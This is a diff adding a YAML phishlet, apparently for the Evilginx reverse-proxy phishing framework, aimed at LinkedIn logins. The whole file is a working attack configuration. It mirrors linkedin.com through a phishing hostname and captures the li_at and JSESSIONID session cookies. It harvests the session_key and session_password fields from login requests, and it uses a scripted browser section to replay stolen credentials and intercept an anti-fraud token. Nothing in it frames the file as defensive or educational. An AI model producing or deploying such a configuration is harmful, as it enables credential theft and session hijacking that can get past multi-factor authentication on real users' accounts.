@@ -1,0 +1,58 @@
+name: 'LinkedIn'
+author: 'LxKh4n1yn-Kali-LinuX'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true }
+
+sub_filters:
+  - { triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'linkedin.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml'] }
+  - { triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'www.linkedin.com', replace: 'www.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'application/x-www-form-urlencoded'] }
+
+auth_tokens:
+  - domain: 'linkedin.com'
+    keys: ['li_at', 'JSESSIONID']
+
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/checkpoint/lg/login-submit'
+
+login:
+  domain: 'www.linkedin.com'
+  path: '/login'
+
+evilpuppet:
+  triggers:
+    - domains: ['www.linkedin.com']
+      paths: ['/checkpoint/lg/login-submit']
+      token: 'apfc'
+      open_url: 'https://www.linkedin.com/login'
+      actions:
+        - selector: '#username'
+          value: '{username}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: '#password'
+          value: '{password}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: 'button[type=submit]'
+          click: true
+          post_wait: 1000
+  interceptors:
+    - token: 'apfc'
+      url_re: '/checkpoint/lg/login-submit'
+      post_re: 'apfc=([^&]*)'
+      abort: true
+
